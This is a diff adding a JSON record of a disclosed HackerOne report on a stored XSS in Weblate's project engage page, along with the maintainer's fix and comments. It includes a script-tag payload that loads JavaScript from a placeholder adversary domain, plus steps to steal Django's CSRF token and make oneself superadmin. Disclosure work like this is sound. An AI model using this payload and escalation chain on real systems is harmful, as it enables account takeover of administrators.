@@ -1,0 +1,312 @@
+{
+  "id": 472391,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzIzOTE=",
+  "url": "https://hackerone.com/reports/472391",
+  "title": "Stored XSS @ /engage/<project_slug>",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-26T22:13:28.975Z",
+  "submitted_at": "2018-12-26T22:13:28.975Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lgian",
+    "url": "/lgian",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-02T12:40:01.189Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-02T12:40:01.110Z",
+  "team_member_agreed_on_going_public_at": "2018-12-27T12:14:26.696Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\nThe vulnerability concerns a Stored XSS, while it is currently (to the best of my knowledge) not exploitable due to limitations stated below. I thought that the issue is worth reporting anyway.\n\n## Steps to reproduce\n1. Change a project's name (or create one) to the following payload:  \n `<script src=\"http://<adversery_domain>/payload.js\"></script>`, where `<adversary_domain>` could be any domain that you own. For testing purposes you can host the javascript file on localhost.\n2. Navigate to `/engage/<project_slug>`, where `<project_slug>` is the project's url slug.\n3. Any javascript payload you host will be executed under the origin of weblate.\n\n## Referenced code\nThe code that is the root cause for the vulnerability is under: `weblate/trans/views/basic.py:show_engage:123`, where `show_engage` is the view called for the `/engage/<project_slug>` url.\n\n### Caveats\n1. A project's name is limited to 60 characters, therefore we cannot inject our payload straight into it. A bypass for that is the one referenced in step 1, where we load an external javascript file from a domain we own.\n2. By default the application's CSP only allows scripts from certain domains (cdnjs etc.). Although, the default CSP allows `unsafe-inline` when any CDN is enabled.\n3. The session cookie is uses the attributes `HttpOnly` and `SameSite=lax`, therefore hijacking the superadmin's session token is impossible (for most browsers).\n4. In order to perform the attack, you have to own a user account that can change a project's name, which is true for any project administrator.\n\n#### Possible bypasses\n1. A project's name character limit is extended.\n2. Since the application supports file uploads and the CSP allows scripts coming from `self` (current domain), one could upload their payload to the Weblate installation. This bypass would require an endpoint that accepts uploading HTML/javascript content and stores it under the `media` uploads. \n\n### Proof of Concept\nIn order to get any value of the present XSS, since we cannot steal the superadmin's session token, we can perform any action as the superadmin. That is because we can issue any GET/POST request and read the response, since we operate under the same origin as the hosted application. As mentioned before, in order to perform the following attack, we need a user account that can change a project's name. \n\n1. Issue a GET request under `admin/weblate_auth/user/` in order to find our user record's ID. \n2. Issue a GET request under `admin/weblate_auth/user/5/change/`, assuming that the ID is 5 for instance.\n3. Read the previous' request's response in order to steal the `csrfmiddlewaretoken` that Django injects to protect against such attacks.\n4. Issue a POST request using the above information to make our user a superadmin.\n\nThe `payload.js` that automatically does the steps 2-4 is attached to the report (except for parsing the response for csrftokenmiddlware, which is trivial using javascript).\n\n## Proposed fixes\n1. Escape the project's name using django's `escape` function before output\n2. Remove the `unsafe-inline` directive from the CSP when CDNs are enabled.\n\n## Impact\n\nGiven a bypass to either the project's name character limit or the CSP, any user that has the ability to change a project's name can make themselves a superuser through CSRF.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 397485,
+      "file_name": "payload.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/397/485/52cb8e6376d1408b18dbc1eb6a542dc6376bce6d/payload.js?response-content-disposition=attachment%3B%20filename%3D%22payload.js%22%3B%20filename%2A%3DUTF-8%27%27payload.js&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074210Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b315c332a5576b00618e0bdce5b957a528d2839dd057ec5c32a5e157535afc23",
+      "file_size": 746,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-01-26T12:14:26.771Z",
+  "allow_singular_disclosure_after": -146950063.7943287,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "sameerphad72",
+    "ali",
+    "tiago-danin",
+    "cryptographer",
+    "nonbetter1",
+    "watskip",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 173,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/weblate",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3895910,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks for the report. The escaping is indeed missing, the code should probably use standard Django template instead of manually doing the string formatting.",
+      "automated_response": false,
+      "created_at": "2018-12-27T11:44:25.052Z",
+      "updated_at": "2018-12-27T11:44:25.052Z",
+      "actor": {
+        "username": "nijel",
+        "cleared": false,
+        "verified": false,
+        "url": "/nijel",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 3895983,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks for spotting, fixed in https://github.com/WeblateOrg/weblate/commit/63218cd4256941f02030b663d7207d69a0f1f173, it will be deployed later today.\n\nAs for unsafe-inline, this is needed for various third party integrations, but I believe it could be avoided as well. I've created issue for that in our issue tracker https://github.com/WeblateOrg/weblate/issues/2471.",
+      "automated_response": false,
+      "created_at": "2018-12-27T12:12:47.039Z",
+      "updated_at": "2018-12-27T12:12:47.039Z",
+      "actor": {
+        "username": "nijel",
+        "cleared": false,
+        "verified": false,
+        "url": "/nijel",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lgian",
+        "url": "/lgian"
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 3895989,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Additional note: The CSRF will not work thanks to Django CSRF protection, it will fail on invalid CSRF token which is hardcoded in the payload.js.",
+      "automated_response": false,
+      "created_at": "2018-12-27T12:14:18.282Z",
+      "updated_at": "2018-12-27T12:14:18.282Z",
+      "actor": {
+        "username": "nijel",
+        "cleared": false,
+        "verified": false,
+        "url": "/nijel",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 3895991,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-12-27T12:14:26.731Z",
+      "updated_at": "2018-12-27T12:14:26.731Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "nijel",
+        "cleared": false,
+        "verified": false,
+        "url": "/nijel",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/153/118/21d9e64f7cd44782a2ec35d76eaebf9294308c83_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 3897431,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for the quick response regarding the issue.\n\nI apologize for the quite lacking PoC, I uploaded the finalized payload.\n\nAs I described above in PoC section, the fact that you run javascript under the origin of the application you can first issue a GET request under `/admin/weblate_auth/user/<ID>/change/, read the response, extract the `csrfmiddlewaretoken` injected by Django, in order to successfully perform the CSRF attack.\n\nI tested this locally ( when debug is on, CSP is disabled that is why the PoC worked ), and I successfully made myself superuser. The only step I did not automate was to figure out my own user ID, but it is trivial considering that you can issue another GET request under `admin/weblate_auth/user/` and extract it too.\n",
+      "automated_response": false,
+      "created_at": "2018-12-27T18:27:09.899Z",
+      "updated_at": "2018-12-27T18:27:09.899Z",
+      "actor": {
+        "username": "lgian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lgian",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 397955,
+          "filename": "payload.js",
+          "type": "text/plain",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/397/955/5925e62e8eb3cae68398aa236913cf8b8f0cee8d/payload.js?response-content-disposition=attachment%3B%20filename%3D%22payload.js%22%3B%20filename%2A%3DUTF-8%27%27payload.js&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3C7WDVGJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074210Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIDn3me4BiYTd9cEhiJgERTjoUKuLBgplckyo1gv%2Bebm1AiEAoY8YKDOvzgyQ3egDWlUq%2Bg%2BoNFbGN1HoNJcuLub14nsqsQUIKBADGgwwMTM2MTkyNzQ4NDkiDEqDO33z8UmFn3D1piqOBXBmutxLn4O8upRMZQVOHUfAZz%2F5H956nuLFNB1w4dHM76Efd6Esqgkx2W3whuKEdFaGEO2k4o2AP0w7OpJczkeT3IDGGn4RUI5bPh%2BiJMkqVI8tK3UzEpJJUSF6HbMTrwao7Uati6%2BREOOmMX2yjZ83ZIRyEqtTJSLCS4BGXULPEFPojDY4qjNA5b60yyjAnPj6gbXk%2BZoo550WZHFsUcA0FJSu69aScHPCXoxh2hDEQf8HLfH4FrgkK4qMpYKxTdxDKK46CLw%2Fg8T4YuK2rOrqRiOsGsGglYhAi9L5PX6QU8fFeU49TJFGG%2BkWWZX7ZXAb53PZjbJmvmXB%2FTEgBADExPBqb0GtBwSXjsfeg2MUkJ1JJKrjSnftn2uF44Lwl3eXcyZ%2FLbiRYRl8qOKyOuIMKOV4yidbKYdgPdbf35OZMs6zr%2F%2FRxFnwc%2FHV68T%2BizwT%2BFlshKH3y%2B%2BbJFOP6i0T1v7M7nKQFvxNABDtplEI%2B9fqUGW1Dg7ibbsBkVWXePr29ZQd73EmOTWK8CQDFOrZf9Oy4UK9y%2FKH%2Bc21lt7H7ZwU%2Fa2h97u0mRoHMoHc1rVbSje1tINDMsdaGwQRGz3ysdTjmviAJnhwBli9m9wXmWXllBnkXU4%2BfQtLWMu4iVOFewLKkpWUKsLuXh6jx3JosBPmfDd1N42E7Fr4XdEKa0y47oWruRIqlmjxP4X6JXrTROYLdF2CZ0zhGeAUylgD%2B4xxKokPK%2FGkiiw5BiLcaWolpFCXanJqcdWdwy6yMeRcmWXvrr50l3xmx4ZVenDU%2FJtgoI%2BVznl1w5kWpZyrrryWGATyEfw47VeINLtjJXQiBm%2FtsdJKR%2FUNyu1wxs4SPRLdf%2Fje9wnFOdNjAzD4n7qoBjqxAclBXSZX5G1EGG0VOqTUzC21u2MNyu51phI1ys1%2B6uIP3wgenMeIXpBmciTImpA3aFP4ng9cLZGSnZTRsU0zXZxH4%2FyvKBheT7YuS%2F6dlvGllnxjsRJpJSxFtvt%2BwQMln5HVRmPnEIWXGkSOdOWIYAiRkfYoHWEIfPVniUKAcjpGHmd44L06V2hWu2jHKJz33sdHWQxZVh5RDQ0uL0bYoUosxbzl%2BjgtMDeHkZmRLFwM3Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b16181f510c101e9f181698eb06fdbbd0c54f5f2e6a79556a4b2c5ca5c45ddc3"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 5238355,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-07-02T12:40:01.141Z",
+      "updated_at": "2019-07-02T12:40:01.141Z",
+      "actor": {
+        "username": "lgian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lgian",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    },
+    {
+      "id": 5238356,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-07-02T12:40:01.209Z",
+      "updated_at": "2019-07-02T12:40:01.209Z",
+      "actor": {
+        "username": "lgian",
+        "cleared": false,
+        "verified": false,
+        "url": "/lgian",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "weblate"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
